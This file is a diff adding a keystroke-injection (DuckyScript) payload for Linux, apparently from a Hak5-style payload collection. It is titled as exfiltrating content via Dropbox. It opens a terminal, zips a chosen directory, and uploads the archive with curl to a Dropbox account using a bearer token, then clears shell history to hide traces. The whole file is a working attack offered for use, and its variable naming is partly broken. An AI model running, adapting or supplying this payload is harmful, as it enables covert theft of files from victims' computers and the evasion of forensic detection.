@@ -1,0 +1,61 @@
+##########################################################
+#                                                        #
+# Title        : Exfiltrate Linux Content With Dropbox   #
+# Author       : Aleff                                   #
+# Version      : 1.0                                     #
+# Category     : Exfiltration                            #
+# Target       : Linux                                   #
+#                                                        #
+##########################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Internet Connection
+#  - DROPBOX_ACCESS_TOKEN
+
+# VARIABLES
+# - 1) Set here your Dropbox access TOKEN
+DROPBOX_ACCESS_TOKEN='example'
+# - 2) Set here the directory that you want to Exfiltrate i.e. '/home/USER_NAME/Documents' Pay attention to the fact that this payload is set up to know the user name of the machines, which is identified via the variable \$USER
+DIRECTORY-PATH='example'
+
+# CONSTS
+DROPBOX_API_CONST='https://content.dropboxapi.com/2/files/upload'
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 500
+QUACK STRING USER_NAME=\$(whoami)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING RANDOM=\$(shuf -i 1-999999999999 -n 1)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING NAME=\"\$RANDOM.zip\"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING ZIP_PATH=\"\$DIRECTORY-PATH/\$NAME\"
+QUACK ENTER
+QUACK DELAY 500
+
+# Delay for zipping operation, it depends by computer power and folder directory
+QUACK DELAY 10000
+
+QUACK DELAY 500
+QUACK STRING if [ -r \"\$DIRECTORY-PATH\" ]; then
+QUACK ENTER
+QUACK STRING zip -r \"\$ZIP_PATH\" \"\$DIRECTORY-PATH\" > /dev/null 2>&1
+QUACK ENTER
+QUACK STRING else
+QUACK ENTER
+QUACK STRING echo   \"\"
+QUACK ENTER
+QUACK STRING fi
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING DROPBOX_FOLDER=\"/\$NAME\"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING curl -X POST $DROPBOX_API_CONST --header \"Authorization: Bearer $DROPBOX_ACCESS_TOKEN\" --header \"Dropbox-API-Arg: {'path': '$DROPBOX_FOLDER','mode': 'add','autorename': true,'mute': false}\" --header \"Content-Type: application/octet-stream\" --data-binary \"@\$ZIP_PATH\"; history -c; exit
+QUACK ENTER
